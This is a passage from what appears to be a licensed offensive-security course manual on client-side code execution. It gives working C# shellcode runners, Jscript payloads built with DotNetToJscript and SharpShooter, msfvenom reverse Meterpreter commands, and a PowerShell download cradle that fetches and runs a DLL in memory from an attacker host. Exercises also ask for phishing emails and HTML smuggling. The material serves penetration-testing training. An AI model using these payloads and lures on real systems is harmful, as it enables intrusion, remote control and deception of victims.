Now that we’ve discussed the basics of Visual Studio, let’s introduce C# code into our Jscript. 
In 2017, security researcher James Forshaw216 created the DotNetToJscript217 project that 
demonstrated how to execute C# assembly from Jscript. In this section, we’ll use this technique 
to create our in-memory shellcode runner. 
First, we need to download the DotNetToJscript project from GitHub or use the version stored 
locally at C:\Tools\DotNetToJscript-master.zip on the Windows 10 development machine. We’ll 
extract it, copy it to our Kali Samba share, and open it in Visual Studio. 
When opening the Visual Studio solution from a remote location, a security warning, similar to the 
one below, prompts us asking if we really want to open it. 
 
Figure 35: Security warning when opening a remote project 
 
216 (James Forshaw, 2019), https://twitter.com/tiraniddo 
217 (James Forshaw, 2018), https://github.com/tyranid/DotNetToJScript 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
113 
 
The security warning raises awareness about the potential for malicious code in configuration 
files that could lead to arbitrary code execution. Essentially, a remote project can become a client 
side code execution vector. 
When opening the Visual Studio project, ensure that the Samba path matches 
that of your Kali system and accept the security warnings. 
Once we’ve opened DotNetToJscript in Visual Studio, we’ll navigate to the Solution Explorer and 
open TestClass.cs under the ExampleAssembly project. 
We’ll compile this as a .dll assembly, which we’ll execute in Jscript. This simple project will display 
a “Test” message box. 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
using System.Windows.Forms; 
 
[ComVisible(true)] 
public class TestClass 
{ 
    public TestClass() 
    { 
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, 
MessageBoxIcon.Exclamation); 
    } 
 
    public void RunProcess(string path) 
    { 
        Process.Start(path); 
    } 
} 
Listing 132 - The default ExampleAssembly code 
Jscript will eventually execute the content of the TestClass method, which is inside the TestClass 
class. In this case, we are simply executing the MessageBox.Show218 method. 
Notice that the Solution Explorer lists a second project (DotNetToJscript) that converts the 
assembly into a format that Jscript can execute. 
At this point, let’s switch from Debug to Release mode and compile the entire solution with Build > 
Build Solution. 
When the solution is compiled, we need to move some files to get DotNetToJscript to work 
correctly. We’ll navigate to the DotNetToJScript folder and copy DotNetToJscript.exe and 
NDesk.Options.dll to the C:\Tools folder on the Windows 10 development machine. Then we’ll go 
 
218 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.messagebox.show?view=netframework-
4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
114 
to the ExampleAssembly folder and also copy ExampleAssembly.dll to C:\Tools. Note that these 
.dll files must be in place whenever we execute a DotNetToJscript program. 
After copying the required files, we’ll open a command prompt on our Windows machine and 
navigate to the C:\Tools folder. 
We need to set a few options at runtime. First, we’ll specify the script language to use (JScript) 
with --lang along with --ver to specify the .NET framework version. On the newest versions of 
Windows 10, only version 4 of the .NET framework is installed and enabled by default, so we’ll 
specify v4. Next, we’ll specify the input file, which in our case is ExampleAssembly.dll. Finally, we’ll 
use the -o flag to specify the output file, in our case a Jscript file. The full command is shown in 
Listing 133. 
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js 
Listing 133 - Invoking DotNetToJscript to create a Jscript file 
Now that the file is created, we can double-click it to run it. This displays our simple popup: 
 
Figure 36: Message box spawned by our Jscript file 
Let’s examine the Jscript code generated by DotNetToJscript to get an idea of what, exactly 
happened. We’ll open demo.js in a text editor to view this code. 
This code begins with three functions: setversion, debug, and base64ToStream. 
function setversion() { 
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 
'v4.0.30319'; 
} 
function debug(s) {} 
function base64ToStream(b) { 
    var enc = new ActiveXObject("System.Text.ASCIIEncoding"); 
    var length = enc.GetByteCount_2(b); 
    var ba = enc.GetBytes_4(b); 
    var transform = new 
ActiveXObject("System.Security.Cryptography.FromBase64Transform"); 
    ba = transform.TransformFinalBlock(ba, 0, length); 
    var ms = new ActiveXObject("System.IO.MemoryStream"); 
    ms.Write(ba, 0, (length / 4) * 3); 
    ms.Position = 0; 
    return ms; 
} 
Listing 134 - First helper functions of Jscript file 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
115 
Let’s examine each of these. The setversion function configures the Windows Script Host to use 
version 4.0.30319 of the .NET framework: 
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 
'v4.0.30319'; 
Listing 135 - First helper function 
The second function (debug) is empty since we did not specify the debug flag (-d) when invoking 
DotNetToJscript: 
function debug(s) {} 
Listing 136 - Second helper function 
Finally, the base64ToStream function is simply a Base64 decoding function that leverages various 
.NET classes through ActiveXObject instantiation: 
function base64ToStream(b) { 
... 
} 
Listing 137 - Third helper function 
Following the helper functions, we find the main content of the script as shown in Listing 138. 
var serialized_obj = "AAEAAAD/////AQAAAA... 
 
var entry_class = 'TestClass'; 
 
try { 
    setversion(); 
    var stm = base64ToStream(serialized_obj); 
    var fmt = new 
ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); 
    var al = new ActiveXObject('System.Collections.ArrayList'); 
    var d = fmt.Deserialize_2(stm); 
    al.Add(undefined); 
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class); 
     
} catch (e) { 
    debug(e.message); 
} 
Listing 138 - Code to decode and deserialize the C# assembly 
Let’s analyze this code. First, a Base64 encoded binary blob is embedded into the file. This is our 
compiled C# assembly. 
var serialized_obj = "AAEAAAD/////AQAAAA... 
Listing 139 - Base64 encoded binary blob 
Next, we specify the name of the class inside the compiled assembly that we want to execute. In 
our case it’s named TestClass: 
var entry_class = 'TestClass'; 
Listing 140 - Testclass variable 
After specifying the name of the class, the heart of the script begins. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
116 
First, we set the .NET framework version and Base64-decode the blob as shown in Listing 141. 
Next, a BinaryFormatter219 object is instantiatied, from which we call the Deserialize220 method. At 
this point, the d variable contains the decoded and deserialized assembly ExampleAssembly.dll in 
memory. 
setversion(); 
var stm = base64ToStream(serialized_obj); 
var fmt = new 
ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); 
var d = fmt.Deserialize_2(stm); 
Listing 141 - Base64 decoded binary blob 
To execute the relevant method inside the assembly, we’ll use the DynamicInvoke221 and 
CreateInstance222 methods. DynamicInvoke accepts an array of arguments but no arguments are 
required by the constructor of the “TestClass” class. 
We solve this by creating an array assigned to the “al” variable, then add an undefined object to 
keep it empty and convert it to an array through ToArray(). This creates an empty array which is 
passed to DynamicInvoke as shown in Listing 142. 
var al = new ActiveXObject('System.Collections.ArrayList'); 
... 
al.Add(undefined); 
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class); 
Listing 142 - DynamicInvoke code 
Finally we execute the constructor through CreateInstance by supplying its name, which is stored 
in entry_class. 
Now, thanks to DotNetToJscript, we have the framework we can use to easily convert any C# 
code into a format that can be executed from a Jscript file. This brings us closer to having the 
ability to execute Win32 APIs. 
4.2.2.1 Exercises 
1. 
Set up the DotNetToJscript project, share it on the Samba share, and open it in Visual Studio. 
2. 
Compile the default ExampleAssembly project and convert it into a Jscript file with 
DotNetToJscript. 
3. 
Modify the TestClass.cs file to make it launch a command prompt instead of opening a 
MessageBox. 
 
219 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.8 
220 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter.deserialize?view=netframework-4.8 
221 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.delegate.dynamicinvoke?view=netframework-4.8 
222 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.createinstance?view=netframework-
4.8#System_Reflection_Assembly_CreateInstance_System_String_ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
117 
4.2.3 Win32 API Calls From C# 
With the simple example behind us, we’ll now rehearse how to make calls to arbitrary Win32 APIs. 
We can leverage the DllImport statement used in a previous module to import and link any Win32 
APIs into C#. We’ll need to once again translate the C-style argument data types to C# through 
the P/Invoke technique. 
When calling Win32 APIs from PowerShell (in the previous module), we 
demonstrated the straightforward Add-Type method and the more complicated 
reflection technique. However, the complexity of reflection was well worth it as 
we avoided writing C# source code and compiled assembly files temporarily to 
disk during execution. Luckily, when dealing with C#, we can compile the 
assembly before sending it to the victim and execute it in memory, which will 
avoid this problem. 
Let’s make a proof-of-concept example that imports MessageBoxA and calls it from C#. To 
simplify this, we’ll use the Visual Studio solution we created for the Hello World example. 
First we’ll look up MessageBox on www.pinvoke.net223 to help translate the C data types to C# 
data types. 
To use MessageBoxA, we need an import statement added inside the Program class but outside 
the Main method, as shown in Listing 143. With the Win32 API imported, we simply invoke it by 
supplying text and a caption as highlighted below. 
using System.Collections.Generic; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
 
namespace ConsoleApp1 
{ 
    class Program 
    { 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, 
int options); 
 
        static void Main(string[] args) 
        { 
            MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0); 
        } 
    } 
} 
Listing 143 - C# code to import and use MessageBoxA 
 
223 (Pinvoke, 2019), http://pinvoke.net/default.aspx/user32/MessageBox.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
118 
As shown in Figure 37, Visual Studio highlights potential issues with the DllImport statement due 
to missing namespaces. To use the DllImport statement and invoke the Win32 APIs, we have to 
use the two namespaces (System.Diagnostics and System.Runtime.InteropServices) as shown 
below. 
 
Figure 37: Missing namespaces 
In addition, we need to add the core System namespace that provides us access to all basic data 
types such as IntPtr. Here’s our full code so far: 
using System; 
using System.Collections.Generic; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
 
namespace ConsoleApp1 
{ 
    class Program 
    { 
        [DllImport("user32.dll", CharSet = CharSet.Auto)] 
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, 
int options); 
 
        static void Main(string[] args) 
        { 
             MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0); 
        } 
    } 
} 
Listing 144 - Full code 
At this point, we can compile the application without errors and launch it from the command 
prompt. This should generate a popup with our text. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
119 
Now that we’ve again demonstrated how to import and call Win32 APIs from C# without having 
to use reflection, in the next section we’ll recreate our PowerShell shellcode runner in C#. 
4.2.3.1 Exercise 
1. 
Implement the Win32 MessageBox API call in C# as shown in this section. 
4.2.4 Shellcode Runner in C# 
Now that we have the basic framework, we can reuse the shellcode runner technique from both 
VBA and PowerShell and combine VirtualAlloc, CreateThread, and WaitForSingleObject to execute 
shellcode in memory. 
The first step is to use DllImport to import the three Win32 APIs and configure the appropriate 
argument data types. This is unchanged from our experience with Add-Type and PowerShell. The 
imports are shown in Listing 145. 
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType,  
    uint flProtect); 
 
[DllImport("kernel32.dll")] 
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,  
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId); 
 
[DllImport("kernel32.dll")] 
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 
Listing 145 - Importing Win32 APIs for shellcode runner 
Next, we need to generate our shellcode. Keep in mind that on a 64-bit Windows operating 
system, Jscript will execute in a 64-bit context by default so we have to generate a 64-bit 
Meterpreter staged payload in csharp format. While we’re at it, we’ll set up our multi/handler with 
the same payload. 
Calling the APIs from C# is similar to our experience with PowerShell. However, 
we do not have to specify .NET namespaces like 
[System.Runtime.InteropServices.Marshal] or the runtime compiled classes to 
invoke them. 
In Listing 146, the calls to the three Win32 APIs along with the managed to unmanaged memory 
copy are present, and constitute the last part of the shellcode runner. This should look very similar 
to what we did earlier. 
Let’s discuss a few details of this code, starting with the variable declarations. The first, buf, is our 
shellcode. Next is our size variable that stores the size of our buf variable. As mentioned earlier, 
we 
use 
Marshal.Copy, 
but 
don’t 
have 
to 
specify 
the 
.NET 
namespace 
of 
[System.Runtime.InteropServices.Marshal]. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
120 
byte[] buf = new byte[626] { 
  0xfc,0x48,0x83,0xe4,0xf0,0xe8... 
 
int size = buf.Length; 
 
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40); 
 
Marshal.Copy(buf, 0, addr, size); 
 
IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); 
 
WaitForSingleObject(hThread, 0xFFFFFFFF); 
Listing 146 - Win32 APIs called from C# to execute shellcode 
We’ll once again use the WaitForSingleObject API to let the shellcode finish execution. Otherwise, 
the Jscript execution would terminate the process before the shell becomes active. 
Here’s the full code of our C# shellcode runner: 
using System; 
using System.Collections.Generic; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
 
namespace ConsoleApp1 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
flAllocationType, uint flProtect); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
 
        [DllImport("kernel32.dll")] 
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 
dwMilliseconds); 
 
        static void Main(string[] args) 
        { 
            byte[] buf = new byte[630] { 
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 
  ... 
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 }; 
 
            int size = buf.Length; 
 
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40); 
 
            Marshal.Copy(buf, 0, addr, size); 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
121 
 
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, 
IntPtr.Zero); 
 
            WaitForSingleObject(hThread, 0xFFFFFFFF); 
        } 
    } 
} 
 
Listing 147 - Win32 APIs called from C# to execute shellcode full code 
Before compiling this project, we must set the CPU architecture to x64 since we are using 64-bit 
shellcode. This is done through the CPU drop down menu, where we open the Configuration 
Manager as shown in Figure 38. 
 
Figure 38: Opening Configuration Manager in Visual Studio 
In the Configuration Manager, we choose <New…> from the Platform drop down menu and accept 
the new platform as x64, as shown in Figure 39. 
 
Figure 39: Opening Configuration Manager in Visual Studio 
Now we’ll need to compile the C# project, which will generate an executable on our Samba share. 
Executing it will give us a reverse Meterpreter shell. 
Nice. We are one step closer. In the next section we will get this running in the context of the 
DotNetToJscript project. 
4.2.4.1 Exercise 
1. 
Recreate the C# shellcode runner and obtain a reverse shell. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
122 
4.2.5 Jscript Shellcode Runner 
Now that we have the C# shellcode runner working, we must modify the ExampleAssembly 
project in DotNetToJscript to execute the shellcode runner instead of the previous simple proof of 
concept code. We’ll also generate a Jscript file with the compiled assembly so we can launch the 
shellcode runner directly from Jscript. 
As mentioned earlier, any declarations using DllImport must be placed in the relevant class, but 
outside the method it is used in. In this case, we need to put them in the TestClass class as 
shown below in Listing 148. 
Note that we added the needed namespaces at the beginning of the project with the “using” 
keyword followed by the namespace: 
using System; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
 
[ComVisible(true)] 
public class TestClass 
{ 
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,  
      uint flAllocationType, uint flProtect); 
 
    [DllImport("kernel32.dll")] 
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,  
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId); 
 
    [DllImport("kernel32.dll")] 
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 
 
... 
Listing 148 - Win32 APIs imported in ExampleAssembly 
Next, we’ll add the same shellcode and method calls inside the TestClass method as in our 
standalone project: 
public TestClass() 
{ 
      byte[] buf = new byte[626] { 
          0xfc,0x48,0x83,0xe4,0xf0,0xe8... 
 
      int size = buf.Length; 
 
      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40); 
 
      Marshal.Copy(buf, 0, addr, size); 
 
      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, 
IntPtr.Zero); 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
123 
      WaitForSingleObject(hThread, 0xFFFFFFFF); 
} 
Listing 149 - Win32 APIs used for shellcode execution 
Before we compile the ExampleAssembly project, we need to specify the x64 platform. After 
compilation, we need to copy the compiled DLL into the same folder as DotNetToJscript.exe on 
the Windows 10 development machine. 
Now that we have our updated DLL in place, we can invoke DotNetToJscript with the same 
arguments as earlier, telling it to use version 4 of the .NET framework and output a Jscript file, as 
shown below. 
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js 
Listing 150 - Invoking DotNetToJscript to create a Jscript shellcode runner 
With our multi/handler set up, we can double-click the Jscript file. After a brief pause, we should 
receive the staged reverse Meterpreter shell. Very nice. 
We have successfully leveraged Jscript to deliver an arbitrary C# assembly, which in our case is a 
shellcode runner. 
4.2.5.1 Exercises 
1. 
Recreate the steps to obtain a Jscript shellcode runner. 
2. 
Use DotNetToJscript to obtain a shellcode runner in VBScript format. 
4.2.5.2 Extra Mile 
Create the text for a phishing email using a pretext that would make sense for your organization, 
school, or customer. Frame the text to convince the victim to click on an embedded link that leads 
to an HTML page on your Kali system. 
Manually create the HTML page sitting on your Apache web server so it performs HTML 
smuggling of a Jscript shellcode runner when the link is opened with Google Chrome. Ensure that 
the email text and the content of the HTML page encourage the victim to run the Jscript file. 
4.2.6 SharpShooter 
In recent years, it has become much more common to use DotNetToJscript to weaponize C# 
compiled assemblies in other file formats (like Jscript, VBScript, and even Microsoft Office 
macros). A payload generation tool called SharpShooter224 has been created to assist with this. 
SharpShooter is “a payload creation framework for the retrieval and execution of arbitrary C# 
source code”225 and automates part of the process discussed in this module. As with any 
automated tool, it is vital that we understand how it works, especially when it comes to bypassing 
security software and mitigations that will be present in most organizations. 
 
224 (MDSec’s ActiveBreach Team, 2019), https://github.com/mdsecactivebreach/SharpShooter 
225 (MDSec’s ActiveBreach Team, 2019), https://github.com/mdsecactivebreach/SharpShooter 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
124 
 
SharpShooter is capable of evading various types of security software but that 
topic is outside the scope of this module. 
We can install SharpShooter on Kali with git clone and Python pip226 as shown in Listing 151. 
kali@kali:~$ cd /opt/ 
 
kali@kali:/opt$ sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git 
Cloning into 'SharpShooter'... 
 
kali@kali:/opt$ cd SharpShooter/ 
 
kali@kali:/opt/SharpShooter$ sudo pip install -r requirements.txt 
Listing 151 - Installing SharpShooter on Kali Linux 
If confronted with a message saying that pip cannot be found, install the 
package with sudo apt install python-pip 
With SharpShooter installed, we’ll try to replicate what we did manually in this module, creating a 
shellcode runner with Jscript by leveraging DotNetToJscript. 
First, we’ll use msfvenom to generate our Meterpreter reverse stager and write the raw output 
format to a file. 
kali@kali:/opt/SharpShooter$ sudo msfvenom -p windows/x64/meterpreter/reverse_https 
LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt 
... 
Payload size: 716 bytes 
Saved as: /var/www/html/shell.txt 
Listing 152 - Creating a raw Meterpreter staged payload 
Next, we’ll invoke SharpShooter.py while supplying a number of parameters, as shown in Listing 
153. The first --payload js, will specify a Jscript output format. The next parameter, --
dotnetver, sets the .NET framework version to target. The --stageless parameter specifies in-
memory execution of the Meterpreter shellcode. 
The term stageless for SharpShooter refers to whether the entire Jscript payload 
is transferred at once, or if HTML smuggling is used with a staged Jscript 
payload. 
 
226 (W3Schools, 2019), https://www.w3schools.com/python/python_pip.asp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
125 
--rawscfile specifies the file containing our shellcode and we set our output file with --output, 
leaving off the file extension. The full command is shown in Listing 153. 
kali@kali:/opt/SharpShooter$ sudo python SharpShooter.py --payload js --dotnetver 4 --
stageless --rawscfile /var/www/html/shell.txt --output test 
... 
     
[*] Written delivery payload to output/test.js 
Listing 153 - Generating malicious Jscript file with SharpShooter 
Once again we must configure a multi/handler matching the generated Meterpreter shellcode. 
When that is done, we need to copy the generated test.js file to our Windows 10 victim machine. 
When we double-click it, we obtain a reverse shell. 
Using an automated tool can greatly improve productivity and reduce repetitive tasks, but it is 
always important to understand the techniques employed and the operation of underlying code. 
So far, we have taken advantage of both PowerShell and compiled C# assemblies, but we can 
also combine the two to dynamically load assemblies through PowerShell without touching the 
disk. 
4.2.6.1 Exercises 
1. 
Install SharpShooter on Kali and generate a Jscript shellcode runner. 
2. 
Expand on the attack by creating a staged attack227 that also leverages HTML smuggling to 
deliver the malicious Jscript file. 
4.3 In-memory PowerShell Revisited 
We developed powerful tradecraft With Windows Script Host and C#. Let’s go back and combine 
that with our PowerShell and Office tradecraft from the previous module to develop another way 
of executing C# code entirely in memory. 
One of the issues when executing PowerShell in-memory was the use of Add-Type or the rather 
complicated use of reflection. While we proved that it is possible to call Win32 APIs and create a 
shellcode runner in PowerShell entirely in-memory, we can also do this by combining PowerShell 
and C#. 
Using the Add-Type keyword made the .NET framework both compile and load the C# assembly 
into the PowerShell process. However, we can separate these steps, then fetch the pre-compiled 
assembly and load it directly into memory. 
4.3.1 Reflective Load 
To begin, we’ll open the previous ConsoleApp1 C# project in Visual Studio. We’ll create a new 
project in the solution to house our code by right-clicking Solution ‘ConsoleApp1’ in the Solution 
Explorer, navigating to Add, and clicking New Project… as shown in Figure 40. 
 
227 (MDSec, 2018), https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
126 
 
Figure 40: Creating a new project from Solution Explorer 
From the Add a new project menu, we’ll select Class Library (.Net Framework), which will create a 
managed DLL when we compile (Figure 41). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
127 
 
Figure 41: Selecting a Class Library project 
After clicking Next, we’ll accept the default name of ClassLibrary1, click Create, and accept the 
security warning about remote projects. 
The process of creating a managed EXE is similar to that of creating a managed DLL. In fact, we 
can begin by copying the contents of the Program class of the ConsoleApp1 project into the new 
Class1 class. We’ll copy the DllImport statements as-is then create a runner method with the 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
128 
prefixes public, static, and void. This will serve as the body of the shellcode runner and must be 
available through reflection, which is why we declared it as public and static. 
public class Class1 
{ 
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
     uint flAllocationType, uint flProtect); 
 
    [DllImport("kernel32.dll")] 
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr 
lpThreadId); 
 
    [DllImport("kernel32.dll")] 
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 
 
    public static void runner() 
    { 
    } 
Listing 154 - DllImports and definition of runner method 
Next we’ll copy the exact content of the Main method of the ConsoleApp1 project into the runner 
method. We’ll also need to replace the namespace imports to match those of the ConsoleApp1 
project. 
With the C# code complete, we can compile it and copy the resulting DLL (ClassLibrary1.dll) into 
the web root of our Kali Linux machine. 
Once the file is in place, we’ll ensure that Apache is started and configure a multi/handler 
Metasploit listener. 
In a new 64-bit session of PowerShell ISE on the Windows 10 development machine, we’ll use a 
download cradle to fetch the newly-compiled DLL. As shown in Listing 155, we’ll use the LoadFile 
method from the System.Reflection.Assembly namespace to dynamically load our pre-compiled 
C# assembly into the process. This works in both PowerShell and native C#. 
(New-Object 
System.Net.WebClient).DownloadFile('http://192.168.119.120/ClassLibrary1.dll', 
'C:\Users\Offsec\ClassLibrary1.dll') 
 
$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll") 
Listing 155 - Downloading the assembly and loading it into memory 
After the assembly is loaded, we can interact with it using reflection through the GetType and 
GetMethod methods, and finally call it through the Invoke method: 
$class = $assem.GetType("ClassLibrary1.Class1") 
$method = $class.GetMethod("runner") 
$method.Invoke(0, $null) 
Listing 156 - Executing the loaded assembly using reflection 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
129 
Executing this PowerShell results in a reverse Meterpreter shell, but it will download the assembly 
to disk before loading it. We can subvert this by instead using the Load228 method, which accepts 
a Byte array in memory instead of a disk file. In this case, we’ll modify our PowerShell code to use 
the DownloadData229 method of the Net.WebClient class to download the DLL as a byte array. 
$data = (New-Object 
System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll') 
 
$assem = [System.Reflection.Assembly]::Load($data) 
$class = $assem.GetType("ClassLibrary1.Class1") 
$method = $class.GetMethod("runner") 
$method.Invoke(0, $null) 
Listing 157 - Using DownloadData and Load to execute the assembly from memory 
With this change, we have successfully loaded precompiled C# assembly directly into memory 
without touching disk and executed our shellcode runner. Excellent! 
4.3.1.1 Exercises 
1. 
Build the C# project and compile the code in Visual Studio. 
2. 
Perform the dynamic load of the assembly through the download cradle both using LoadFile 
and Load (Remember to use a 64-bit PowerShell ISE console). 
3. 
Using what we have learned in these two modules, modify the C# and PowerShell code and 
use this technique from within a Word macro. Remember that Word runs as a 32-bit 
process. 
4.4 Wrapping Up 
In this module, we have explored another avenue of client-side code execution using Jscript and 
C#, with the same low-profile capability as our previous version that leveraged Microsoft Office 
and PowerShell. 
Even though we have used multiple languages and techniques to obtain code execution, there are 
even more combinations in the wild. Penetration testers have used the HTML Application or 
HTA230 attack against Internet Explorer for many years. The combination of HTA and HTML 
smuggling has allowed it to be efficiently used against other browsers and weaponized as the 
Demiguise231 tool. 
A somewhat newer technique leverages the ability to instantiate other scripting engines in .NET 
like IronPython,232 which lets a penetration tester combine the power of Python and .NET. 
Trinity233 is a framework for implementing this post-exploitation. 
 
228 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.8 
229 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=netframework-4.8 
230 (Mitre, 2018), https://attack.mitre.org/techniques/T1170/ 
231 (Demiguise, 2017), https://github.com/nccgroup/demiguise/blob/master/Readme.md 
232 (IronPython, 2018), https://ironpython.net/ 
233 (SilentTrinity, 2019), https://github.com/byt3bl33d3r/SILENTTRINITY 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
130 
Java234-based Java Applets235 and Java JAR236 files can be used to gain client-side code 
execution. The most common variant using Java JAR files in the wild is called jRAT or Adwind.237 
This variant implements reflection and in-memory compilation techniques in Java. Java also 
contains a built-in JavaScript scripting engine called Nashhorn.238 
 
234 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Java_(programming_language) 
235 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Java_applet 
236 (Wikipedia, 2019), https://en.wikipedia.org/wiki/JAR_(file_format) 
